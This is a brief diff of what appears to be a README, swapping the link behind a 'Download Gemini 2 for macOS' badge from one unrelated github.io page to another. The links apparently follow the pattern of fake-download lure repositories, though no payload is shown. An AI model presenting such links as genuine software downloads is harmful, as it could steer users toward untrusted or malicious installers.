@@ -4,7 +4,7 @@
 
 ## 📥 Download Gemini 2 for macOS
 
-[![⬇️ Download Gemini 2 Mac](https://img.shields.io/badge/Download-Gemini%202%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Gemini)
+[![⬇️ Download Gemini 2 Mac](https://img.shields.io/badge/Download-Gemini%202%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Gemini)
 
 ---
 
